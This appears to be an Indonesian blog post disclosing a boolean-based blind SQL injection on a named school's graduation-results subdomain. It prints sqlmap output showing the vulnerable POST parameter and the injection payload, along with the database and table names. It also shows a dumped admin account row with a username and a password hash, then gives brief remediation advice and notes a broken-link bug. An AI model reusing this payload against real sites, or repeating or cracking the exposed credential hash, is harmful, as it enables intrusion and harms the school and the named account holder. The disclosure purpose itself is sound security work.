+++
title = "BUG PADA WEBSITE [ CRITICAL ] / BERBAHAYA"
penulis = "Admin"
+++
Kepada YTH. BPK/IBU Guru SMP1KRAGAN

saya menemukan celah  SQLI BOOLEAN BASED di halaman lulus.smp1kragan.sch.id/index.php?page=carinisn

setelah saya test alhasil muncul INFORMASI database , segera di fix untuk mencegah webste Ter Hack. Berikut informasi yang saya dapatkan : 

![](https://jongnesia.com/tutorial/sqli.png)

```mysql
Database: u873893874_dblulus
[3 tables]
+------------+

| tb_student |

| tbl_profil |

| tbl_user   |

+------------+
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: nisn (POST)

    Type: boolean-based blind

    Title: AND boolean-based blind - WHERE or HAVING clause

    Payload: nisn=' OR '1' AND 9477=9477-- JuzH&SUBMIT=PERIKSA DATA
---

web application technology: PHP 7.4.33, LiteSpeed

back-end DBMS: active fingerprint: MySQL >= 5.7

               comment injection fingerprint: MySQL 5.6.52

               fork fingerprint: MariaDB

available databases [2]:
[*] information_schema
[*] u873893874_dblulus
Database: u873893874_dblulus
Table: tbl_user
[1 entry]
+---------+--------+----------------------------------+----------+
| id_user | nama   | pass                             | username 
+---------+--------+----------------------------------+----------+
| 0       | Taufiq | 918b5ec119b2e29bd5b2c7c09f39d2ae | admin    |
+---------+--------+----------------------------------+----------+ 
```





Cara Mengatasi Bug :

1. Di filter code bagian untuk cek nya , bisa tanya CHATGPT

2. atau di non aktifkan dulu aja subdomainya



BUG KE 2

![](https://jongnesia.com/tutorial/web.png)

pada tampilan utama website  smpn1kragan.sch.id , coba pencet salah satu postingan. maka akan error https://smp1kragan.sch.id/'.$base_url.'blog/'.$row_new_blog['post_id'].'-'.$row_new_blog['seotitle'].'.html . ini mungkin kesalahan codingan nya. 












